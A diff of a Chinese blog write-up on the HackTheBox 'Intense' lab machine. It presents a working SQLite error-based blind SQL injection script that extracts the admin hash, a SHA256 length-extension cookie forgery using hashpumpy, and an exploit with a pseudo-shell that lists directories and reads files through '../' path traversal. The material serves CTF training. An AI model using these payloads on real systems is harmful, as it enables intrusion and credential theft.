class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### Logs functions ####</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_view_log</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> path.exists(<span class="string">f"logs/<span class="subst">&#123;filename&#125;</span>"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f"Can't find <span class="subst">&#123;filename&#125;</span>"</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">f"logs/<span class="subst">&#123;filename&#125;</span>"</span>) <span class="keyword">as</span> out:</span><br><span class="line">        <span class="keyword">return</span> out.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_list_log</span><span class="params">(logdir)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> path.exists(<span class="string">f"logs/<span class="subst">&#123;logdir&#125;</span>"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f"Can't find <span class="subst">&#123;logdir&#125;</span>"</span></span><br><span class="line">    <span class="keyword">return</span> listdir(logdir)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import lwt
+import sqlite3
+from hashlib import sha256
+from flask import g
+from os import listdir, path
+import datetime
 
+
+DATABASE = &quot;database.db&quot;
+
+
+class User:
+    def __str__(self):
+        return &quot;User(username=%s,role=%d)&quot; % (self.username,self.role)
+
+
+def get_db():
+    db = getattr(g, &#39;_database&#39;, None)
+    if db is None:
+        db = g._database = sqlite3.connect(DATABASE)
+    return db
+
+
+def log_login(user):
+    now = datetime.datetime.now()
+    d = now.strftime(&quot;%Y-%m-%d&quot;)
+    with open(f&quot;logs/{d}.log&quot;, &#39;a&#39;) as log:
+        log.write(str(user) + &#39; logged\n&#39;)
+
+
+def badword_in_str(data):
+    data = data.lower()
+    badwords = [&quot;rand&quot;, &quot;system&quot;, &quot;exec&quot;, &quot;date&quot;]
+    for badword in badwords:
+        if badword in data:
+            return True
+    return False
+
+
+def hash_password(password):
+    &quot;&quot;&quot; Hash password with a secure hashing function &quot;&quot;&quot;
+    return sha256(password.encode()).hexdigest()
+
+
+def query_db(query, args=(), one=False):
+    cur = get_db().execute(query, args)
+    rv = cur.fetchall()
+    cur.close()
+    return (rv[0] if rv else None) if one else rv
+
+
+def get_user(username, secret):
+    &quot;&quot;&quot; Returns User object if given username/secret exist in DB &quot;&quot;&quot;
+    username = username.decode()
+    secret = secret.decode()
+    res = query_db(&quot;select role from users where username = ? and secret = ?&quot;, (username, secret), one=True)
+    if res:
+        user = User()
+        user.username = username
+        user.role = res[0]
+        log_login(user)
+        return user
+    return None
+
+def try_login(form):
+    &quot;&quot;&quot; Try to login with the submitted user info &quot;&quot;&quot;
+    if not form:
+        return None
+    username = form[&quot;username&quot;]
+    password = hash_password(form[&quot;password&quot;])
+    result = query_db(&quot;select count(*) from users where username = ? and secret = ?&quot;, (username, password), one=True)
+    if result and result[0]:
+        return {&quot;username&quot;: username, &quot;secret&quot;:password}
+    return None
+
+
+def get_session(request):
+    &quot;&quot;&quot; Get user session and parse it &quot;&quot;&quot;
+    if not request.cookies:
+        return 
+    if &quot;auth&quot; not in request.cookies:
+        return
+    cookie = request.cookies.get(&quot;auth&quot;)
+    try:
+        info = lwt.parse_session(cookie)
+    except lwt.InvalidSignature:
+        return {&quot;status&quot;: -1, &quot;msg&quot;: &quot;Invalid signature&quot;}
+    return info
+
+
+def is_admin(request):
+    session = get_session(request)
+    if not session:
+        return None
+    if &quot;username&quot; not in session or &quot;secret&quot; not in session:
+        return None
+    user = get_user(session[&quot;username&quot;], session[&quot;secret&quot;])
+    return user.role == 1
+
+
+#### Logs functions ####
+def admin_view_log(filename):
+    if not path.exists(f&quot;logs/{filename}&quot;):
+        return f&quot;Can&#39;t find {filename}&quot;
+    with open(f&quot;logs/{filename}&quot;) as out:
+        return out.read()
+
+
+def admin_list_log(logdir):
+    if not path.exists(f&quot;logs/{logdir}&quot;):
+        return f&quot;Can&#39;t find {logdir}&quot;
+    return listdir(logdir)</code></pre>
 <p>这个flask源码整体实现了sqlite的数据库查询。库中有admin账户。通过cookie来判断admin.并且admin有读文件跟列目录的功能。</p>
 <p>首先从utils.py看起。这里的函数关于sqlite执行部分均做了占位符查询，所以不存在注入问题。<code>def badword_in_str(data)</code>做了关键字的筛选。我们去到调用函数的地方,很容易就发现处理的位置<code>/submitmessage</code>存在insert into 型的sql注入。</p>
 <p>注意源码中这里注入的地方返回值是两种：”OK”或者报错。很快就能反应过来是sqlite盲注,并且是使用报错函数来区分布尔值。</p>
 <p>关于sqlite的盲注,普通的布尔盲注与sql注入没什么区别。但是在sql时间盲注的情形下就需要另外处理。因为sqlite没有延时函数,所以想要区分只能利用报错。(这点在st98大佬出的sqlite_voting,前阵子asis的adminpanel中都出现过) 常用的报错函数之<code>RANDOMBLOB()</code>不可用的话,还可以用<code>abs</code>,<code>json</code>等函数。</p>
 <p>这里用abs函数简单构造一个demo</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into messages values(&#39;1&#39;) union select abs(-9223372036854775808);</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">1&#39;) union select abs(case when (1&#x3D;1) then (-9223372036854775808) else 0 end) --</span><br></pre></td></tr></table></figure>
-<p>有个小细节需要注意。不知道是不是insert into语句的问题,如果我们利用<code>abs(-9223372036854775808)</code>这个整体来构造布尔值的话。当语句中出现select会一直报错。而如果我们利用<code>-9223372036854775808</code>来作为真值的话则不会出现这个问题。</p>
+<pre><code>insert into messages values(&#39;1&#39;) union select abs(-9223372036854775808);
+=&gt;
+1&#39;) union select abs(case when (1=1) then (-9223372036854775808) else 0 end) -- </code></pre><p>有个小细节需要注意。不知道是不是insert into语句的问题,如果我们利用<code>abs(-9223372036854775808)</code>这个整体来构造布尔值的话。当语句中出现select会一直报错。而如果我们利用<code>-9223372036854775808</code>来作为真值的话则不会出现这个问题。</p>
 <p>综上,上面这部分很快就能编写exp.本地跑的话,先写个sql<br><img src="/2020/07/22/hackthebox-Intense/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>因为题目源码中很明确的出现了几个列名，所以可以快速编写并创建本地的db.<br>远程跑</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">URL =<span class="string">"http://10.10.10.195"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">        print(<span class="string">"\r"</span> + flag, flush=<span class="literal">False</span>, end=<span class="string">''</span>)</span><br><span class="line">        payload = <span class="string">"a') union select abs(case when (substr((select password from users limit 0,1),"</span> + str(i) + <span class="string">",1)='"</span> + j + <span class="string">"') then(-9223372036854775808) else 0 end )--"</span></span><br><span class="line">        data = &#123;<span class="string">'message'</span>: payload&#125;</span><br><span class="line">        r = requests.post(URL + <span class="string">'submitmessage'</span>, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'overflow'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            flag += j</span><br><span class="line">            print(<span class="string">"\r"</span> + flag, flush=<span class="literal">True</span>, end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"\r"</span>)</span><br><span class="line"><span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests
+import string
+
+URL =&quot;http://10.10.10.195&quot;
+flag = &quot;&quot;
+for i in range(1, 65):
+    a=0
+    for j in string.printable:
+        print(&quot;\r&quot; + flag, flush=False, end=&#39;&#39;)
+        payload = &quot;a&#39;) union select abs(case when (substr((select password from users limit 0,1),&quot; + str(i) + &quot;,1)=&#39;&quot; + j + &quot;&#39;) then(-9223372036854775808) else 0 end )--&quot;
+        data = {&#39;message&#39;: payload}
+        r = requests.post(URL + &#39;submitmessage&#39;, data=data)
+        if &#39;overflow&#39; in r.text:
+            a=1
+            flag += j
+            print(&quot;\r&quot; + flag, flush=True, end=&#39;&#39;)
+            break
+    if a==0:
+        break
+print(&quot;\r&quot;)
+return flag</code></pre>
 <p>得到hash<br><code>f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105</code></p>
 <p>拿到hash后尝试解时果然没有得到明文。看来另有玄机。注意到 lwt.py中一个很显眼的部分</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SECRET = os.urandom(randrange(<span class="number">8</span>, <span class="number">15</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="string">""" Sign message with secret key """</span></span><br><span class="line">    <span class="keyword">return</span> sha256(SECRET + msg).digest()</span><br></pre></td></tr></table></figure>
-<p>这里作为盐值的SECRET处于hash算法sha256的前端。这说明是存在hash扩展攻击的。我们仔细看下其调用位置。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_session</span><span class="params">(cookie)</span>:</span></span><br><span class="line">    <span class="string">""" Parse cookie and return dict</span></span><br><span class="line"><span class="string">        @cookie: "key1=value1;key2=value2"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return &#123;"key1":"value1","key2":"value2"&#125;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    b64_data, b64_sig = cookie.split(<span class="string">'.'</span>)</span><br><span class="line">    data = b64decode(b64_data)</span><br><span class="line">    sig = b64decode(b64_sig)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> verif_signature(data, sig):</span><br><span class="line">        <span class="keyword">raise</span> InvalidSignature</span><br><span class="line">    info = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> group <span class="keyword">in</span> data.split(<span class="string">b';'</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> group:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            key, val = group.split(<span class="string">b'='</span>)</span><br><span class="line">            info[key.decode()] = val</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> info</span><br></pre></td></tr></table></figure>
+<pre><code class="python">SECRET = os.urandom(randrange(8, 15))
 
+def sign(msg):
+    &quot;&quot;&quot; Sign message with secret key &quot;&quot;&quot;
+    return sha256(SECRET + msg).digest()</code></pre>
+<p>这里作为盐值的SECRET处于hash算法sha256的前端。这说明是存在hash扩展攻击的。我们仔细看下其调用位置。</p>
+<pre><code class="python">def parse_session(cookie):
+    &quot;&quot;&quot; Parse cookie and return dict
+        @cookie: &quot;key1=value1;key2=value2&quot;
+
+        return {&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;}
+    &quot;&quot;&quot;
+    b64_data, b64_sig = cookie.split(&#39;.&#39;)
+    data = b64decode(b64_data)
+    sig = b64decode(b64_sig)
+    if not verif_signature(data, sig):
+        raise InvalidSignature
+    info = {}
+    for group in data.split(b&#39;;&#39;):
+        try:
+            if not group:
+                continue
+            key, val = group.split(b&#39;=&#39;)
+            info[key.decode()] = val
+        except Exception:
+            continue
+    return info    </code></pre>
 <p>这里可以发现。它取cookie中由<code>.</code>分割开的两部分分别作为data与sign.其中data是<code>username=guest;secret=SHA256{guest}</code>的base64数据。从这里的取键值返回info的函数很快就能发现存在变量覆盖。比如我们在原始数据后添加<code>username=admin;secret=xxx</code>就能覆盖原先cookie中username与secret的值。而这正是hash长度扩展攻击能做到的：在原有数据上添加新的数据。</p>
 <p>那么回过头来看下它是如何判断admin的。发现果然是从cookie中取admin与secret与数据库中的username与secret进行比较。返回其role值。为1即admin.</p>
 <p>那么接下来就是hash长度扩展攻击了,由于SECRET长度有范围,所以需要小范围尝试一下。并且使用hashpumpy添加数据<code>;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;</code>之所以还要加个分号是因为我们的长度扩展攻击会在原始数据后添加<code>\x00</code>之类的数据。而<code>parse_session</code>函数是按分号识别键,值的。需要另加一个分号避免后面的username键名带上前面的数据。</p>
 <p>因为要做到列目录，读文件，肯定得重复调用。于是打算尝试下写完整的利用脚本来模拟命令行模式,总归是写出来了。虽然我觉得效果一般般,但毕竟是第一次写比较完整的利用,心里还是比较舒适的233.</p>
 <p>因为sql注入部分本地只要10s不到。远程要10分钟多。所以特意加了default选项可以直接使用现成的用户名跟hash.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py default</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashpumpy <span class="keyword">import</span> hashpump</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> cmd <span class="keyword">import</span> Cmd</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">'ignore'</span>)</span><br><span class="line"></span><br><span class="line">URL=<span class="string">'http://10.10.10.195/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">guest_cred=<span class="string">""</span></span><br><span class="line">admin_cookie=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">terminal</span><span class="params">(Cmd)</span>:</span></span><br><span class="line">    <span class="comment">#prompt = "[*] =&gt; "</span></span><br><span class="line">    prompt=<span class="string">'\033[1;31;40m[*]\033[0m'</span>+<span class="string">' =&gt; '</span>+<span class="string">'\033[0;34;40m /var/www/html/app&gt; \033[0m'</span></span><br><span class="line">    print(<span class="string">"[*] prompting a shell(current directory /var/www/html/app)"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">default</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        command=line.split(<span class="string">' '</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(admin_command(command[<span class="number">0</span>],command[<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_admin_name</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[*] getting admin username:"</span>)</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        a=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            print(<span class="string">"\r"</span> + flag, flush=<span class="literal">False</span>, end=<span class="string">''</span>)</span><br><span class="line">            payload = <span class="string">"a') union select abs(case when (substr((select username from users limit 0,1),"</span> + str(i) + <span class="string">",1)='"</span> + j + <span class="string">"') then(-9223372036854775808) else 0 end )--"</span></span><br><span class="line">            data = &#123;<span class="string">'message'</span>: payload&#125;</span><br><span class="line">            r = requests.post(URL + <span class="string">'submitmessage'</span>, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'overflow'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                a=<span class="number">1</span></span><br><span class="line">                flag += j</span><br><span class="line">                print(<span class="string">"\r"</span> + flag, flush=<span class="literal">True</span>, end=<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"\r"</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_admin_hash</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[*] getting admin hash:"</span>+<span class="string">"\r"</span>)</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">64</span> + <span class="number">1</span>):</span><br><span class="line">        a=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            print(<span class="string">"\r"</span> + flag, flush=<span class="literal">False</span>, end=<span class="string">''</span>)</span><br><span class="line">            payload = <span class="string">"a') union select abs(case when (substr((select secret from users limit 0,1),"</span> + str(i) + <span class="string">",1)='"</span> + j + <span class="string">"') then(-9223372036854775808) else 0 end )--"</span></span><br><span class="line">            data = &#123;<span class="string">'message'</span>: payload&#125;</span><br><span class="line">            r = requests.post(URL + <span class="string">'submitmessage'</span>, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'overflow'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                a=<span class="number">1</span></span><br><span class="line">                flag += j</span><br><span class="line">                print(<span class="string">"\r"</span> + flag, flush=<span class="literal">True</span>, end=<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"\r"</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guest_login</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[*] login with guest:guest"</span>+<span class="string">"\r"</span>)</span><br><span class="line">    <span class="keyword">global</span> guest_cred</span><br><span class="line">    users=&#123;<span class="string">'username'</span>:<span class="string">"guest"</span>,<span class="string">"password"</span>:<span class="string">"guest"</span>&#125;</span><br><span class="line">    r=requests.post(URL+<span class="string">'postlogin'</span>,data=users)</span><br><span class="line">    old_data,old_sig=r.cookies[<span class="string">'auth'</span>].split(<span class="string">'.'</span>)</span><br><span class="line">    guest_cred=b64decode(old_data).decode()</span><br><span class="line">    <span class="keyword">return</span> b64decode(old_sig).hex()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crafting_payload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> DEFAULT!=<span class="literal">True</span>:          </span><br><span class="line">        <span class="comment">#from scratch</span></span><br><span class="line">        admin_name=get_admin_name()</span><br><span class="line">        admin_hash=get_admin_hash()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#default</span></span><br><span class="line">        admin_name=<span class="string">"admin"</span></span><br><span class="line">        admin_hash=<span class="string">"f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105"</span></span><br><span class="line">    old_sig = guest_login()</span><br><span class="line">    old_data=guest_cred</span><br><span class="line">    payload=<span class="string">';'</span>+(<span class="string">";"</span>.join([<span class="string">"username="</span>+admin_name,<span class="string">"secret="</span>+admin_hash]))+<span class="string">";"</span></span><br><span class="line">    new_sig=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">15</span>):</span><br><span class="line">        res = hashpump(old_sig, old_data, payload,length)</span><br><span class="line">        cookie=(b64encode(res[<span class="number">1</span>])+<span class="string">b'.'</span>+b64encode(bytes.fromhex(res[<span class="number">0</span>]))).decode()</span><br><span class="line">        <span class="keyword">if</span> admin_login(cookie):</span><br><span class="line">            print(<span class="string">'[*] testing length '</span>+str(length)+<span class="string">" : "</span>)</span><br><span class="line">            print(<span class="string">'[*] admin_cookie: '</span>+ cookie)</span><br><span class="line">            <span class="keyword">return</span> cookie</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"[*] Failes getting proper cookie."</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_login</span><span class="params">(cookie)</span>:</span></span><br><span class="line">    cookies=&#123;<span class="string">"auth"</span>:cookie&#125;</span><br><span class="line">    r=requests.get(URL+<span class="string">'admin'</span>,cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> r.status_code==<span class="number">403</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_command</span><span class="params">(option,command)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> option <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">'dir'</span>,<span class="string">'view'</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Only dir/view supported."</span></span><br><span class="line">    <span class="keyword">elif</span> option==<span class="string">'dir'</span>:</span><br><span class="line">        r=requests.post(URL+<span class="string">'admin/log/dir'</span>,data=&#123;<span class="string">'logdir'</span>:command&#125;,cookies=admin_cookie)</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = requests.post(URL + <span class="string">'admin/log/view'</span>, data=&#123;<span class="string">'logfile'</span>: <span class="string">'../'</span>+command&#125;,cookies=admin_cookie)</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)==<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">'default'</span>:</span><br><span class="line">            print(<span class="string">"[*] use default username + password"</span>)</span><br><span class="line">            DEFAULT=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit(<span class="string">"[*] specify default flag"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        DEFAULT=<span class="literal">False</span></span><br><span class="line">    admin_cookie[<span class="string">'auth'</span>]=crafting_payload()</span><br><span class="line">    terminal().cmdloop()</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">python3 exp.py default</code></pre>
+<pre><code class="python">#!/usr/bin/python3
+import requests
+import string
+from hashpumpy import hashpump
+from base64 import b64decode, b64encode
+from cmd import Cmd
+import sys
+import warnings
 
+warnings.filterwarnings(&#39;ignore&#39;)
+
+URL=&#39;http://10.10.10.195/&#39;
+
+
+guest_cred=&quot;&quot;
+admin_cookie={}
+
+class terminal(Cmd):
+    #prompt = &quot;[*] =&gt; &quot;
+    prompt=&#39;\033[1;31;40m[*]\033[0m&#39;+&#39; =&gt; &#39;+&#39;\033[0;34;40m /var/www/html/app&gt; \033[0m&#39;
+    print(&quot;[*] prompting a shell(current directory /var/www/html/app)&quot;)
+    def default(self, line):
+        command=line.split(&#39; &#39;)
+        try:
+            print(admin_command(command[0],command[1]))
+        except:
+            pass
+
+def get_admin_name():
+    print(&quot;[*] getting admin username:&quot;)
+    flag = &quot;&quot;
+    for i in range(1, 10):
+        a=0
+        for j in string.printable:
+            print(&quot;\r&quot; + flag, flush=False, end=&#39;&#39;)
+            payload = &quot;a&#39;) union select abs(case when (substr((select username from users limit 0,1),&quot; + str(i) + &quot;,1)=&#39;&quot; + j + &quot;&#39;) then(-9223372036854775808) else 0 end )--&quot;
+            data = {&#39;message&#39;: payload}
+            r = requests.post(URL + &#39;submitmessage&#39;, data=data)
+            if &#39;overflow&#39; in r.text:
+                a=1
+                flag += j
+                print(&quot;\r&quot; + flag, flush=True, end=&#39;&#39;)
+                break
+        if a==0:
+            break
+    print(&quot;\r&quot;)
+    return flag
+
+def get_admin_hash():
+    print(&quot;[*] getting admin hash:&quot;+&quot;\r&quot;)
+    flag = &quot;&quot;
+    for i in range(1, 64 + 1):
+        a=0
+        for j in string.printable:
+            print(&quot;\r&quot; + flag, flush=False, end=&#39;&#39;)
+            payload = &quot;a&#39;) union select abs(case when (substr((select secret from users limit 0,1),&quot; + str(i) + &quot;,1)=&#39;&quot; + j + &quot;&#39;) then(-9223372036854775808) else 0 end )--&quot;
+            data = {&#39;message&#39;: payload}
+            r = requests.post(URL + &#39;submitmessage&#39;, data=data)
+            if &#39;overflow&#39; in r.text:
+                a=1
+                flag += j
+                print(&quot;\r&quot; + flag, flush=True, end=&#39;&#39;)
+                break
+        if a==0:
+            break
+    print(&quot;\r&quot;)
+    return flag
+
+def guest_login():
+    print(&quot;[*] login with guest:guest&quot;+&quot;\r&quot;)
+    global guest_cred
+    users={&#39;username&#39;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;}
+    r=requests.post(URL+&#39;postlogin&#39;,data=users)
